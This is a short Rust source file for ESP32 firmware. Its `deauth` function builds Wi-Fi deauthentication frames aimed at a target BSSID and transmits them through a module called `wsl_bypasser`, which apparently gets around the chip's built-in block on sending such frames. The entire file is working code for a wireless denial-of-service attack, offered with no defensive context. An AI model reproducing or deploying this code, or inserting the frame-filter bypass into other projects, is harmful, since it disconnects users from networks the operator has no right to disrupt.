use esp_idf_svc::wifi::WifiDeviceId;

use crate::wsl_bypasser::{send_freedom, deauth_frame_builder};

pub fn deauth(bssid: [u8; 6]) -> Result<(), String>{
    let send_result = send_freedom(WifiDeviceId::Sta, &deauth_frame_builder(bssid));

    // Catch errors:
    if let Err(error) = send_result {
        let error = format!("Error sending frame: {}", error);
        return Err(error);
    }
    
    Ok(())
}